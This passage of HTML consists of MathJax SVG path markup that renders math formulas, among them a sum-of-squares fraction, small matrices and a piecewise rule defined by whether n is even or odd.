287Z"></path></g></g><g data-mml-node="msup" transform="translate(1610.7,0)"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(378,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2670,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(3725.8,0)"><g data-mml-node="mrow" transform="translate(220,710)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(633,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1647.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2648,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3248,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3637,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(4026,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(4526,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(5348.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(6348.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(6848.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(3588.7,-686)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g><rect width="7437.4" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.149ex;" xmlns="http://www.w3.org/2000/svg" width="10.466ex" height="5.43ex" role="img" focusable="false" viewBox="0 -1450 4626 2400"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mrow"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="5B" d="M247 -949V1450H516V1388H309V-887H516V-949H247Z"></path></g><g data-mml-node="mtable" transform="translate(528,0)"><g data-mml-node="mtr" transform="translate(0,700)"><g data-mml-node="mtd"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mtd" transform="translate(1500,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mtd" transform="translate(3070,0)"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g><g data-mml-node="mtr" transform="translate(0,-700)"><g data-mml-node="mtd"><g data-mml-node="mn"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mtd" transform="translate(1500,0)"><g data-mml-node="mn"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g><g data-mml-node="mtd" transform="translate(3070,0)"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g></g></g><line data-line="v" class="mjx-solid" x1="2535" y1="-950" x2="2535" y2="1450"></line></g><g data-mml-node="mo" transform="translate(4098,0) translate(0 -0.5)"><path data-c="5D" d="M11 1388V1450H280V-949H11V-887H218V1388H11Z"></path></g></g></g></g></svg></mjx-container></p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.791ex;" xmlns="http://www.w3.org/2000/svg" width="4.504ex" height="2.713ex" role="img" focusable="false" viewBox="0 -849.5 1990.8 1199"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="OPEN"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="28" d="M152 251Q152 646 388 850H416Q422 844 422 841Q422 837 403 816T357 753T302 649T255 482T236 250Q236 124 255 19T301 -147T356 -251T403 -315T422 -340Q422 -343 416 -349H388Q359 -325 332 -296T271 -213T212 -97T170 56T152 251Z"></path></g></g><g data-mml-node="mtable" transform="translate(458,0)"><g data-mml-node="mtr" transform="translate(0,357.8) scale(0.707)"><g data-mml-node="mtd"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mtd" transform="translate(1045.4,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g><g data-mml-node="mtr" transform="translate(0,-340.7) scale(0.707)"><g data-mml-node="mtd" transform="translate(48,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g></g><g data-mml-node="mtd" transform="translate(999.9,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="CLOSE" transform="translate(1532.8,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="29" d="M305 251Q305 -145 69 -349H56Q43 -349 39 -347T35 -338Q37 -333 60 -307T108 -239T160 -136T204 27T221 250T204 473T160 636T108 740T60 807T35 839Q35 850 50 850H56H69Q197 743 256 566Q305 425 305 251Z"></path></g></g></g></g></svg></mjx-container></p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.149ex;" xmlns="http://www.w3.org/2000/svg" width="28.71ex" height="5.43ex" role="img" focusable="false" viewBox="0 -1450 12690 2400"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mrow"><g data-mml-node="mo" transform="translate(0 250)"></g><g data-mml-node="mtable"><g data-mml-node="mtr" transform="translate(0,700)"><g data-mml-node="mtd"><g data-mml-node="mrow"><g data-mml-node="mtext"><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z"></path><path data-c="66" d="M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z" transform="translate(278,0)"></path><path data-c="A0" d="" transform="translate(584,0)"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(834,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mtext" transform="translate(1434,0)"><path data-c="A0" d=""></path><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(250,0)"></path><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(528,0)"></path><path data-c="20" d="" transform="translate(922,0)"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(1172,0)"></path><path data-c="76" d="M338 431Q344 429 422 429Q479 429 503 431H508V385H497Q439 381 423 345Q421 341 356 172T288 -2Q283 -11 263 -11Q244 -11 239 -2Q99 359 98 364Q93 378 82 381T43 385H19V431H25L33 430Q41 430 53 430T79 430T104 429T122 428Q217 428 232 431H240V385H226Q187 384 184 370Q184 366 235 234L286 102L377 341V349Q377 363 367 372T349 383T335 385H331V431H338Z" transform="translate(1616,0)"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(2144,0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(2588,0)"></path><path data-c="3A" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(3144,0)"></path></g></g></g><g data-mml-node="mtd" transform="translate(5856,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(600,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mn" transform="translate(1100,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><g data-mml-node="mtr" transform="translate(0,-700)"><g data-mml-node="mtd"><g data-mml-node="mrow"><g data-mml-node="mtext"><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z"></path><path data-c="66" d="M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z" transform="translate(278,0)"></path><path data-c="A0" d="" transform="translate(584,0)"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(834,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mtext" transform="translate(1434,0)"><path data-c="A0" d=""></path><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(250,0)"></path><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(528,0)"></path><path data-c="20" d="" transform="translate(922,0)"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(1172,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1672,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(2228,0)"></path><path data-c="3A" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(2784,0)"></path></g></g></g><g data-mml-node="mtd" transform="translate(5856,0)"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 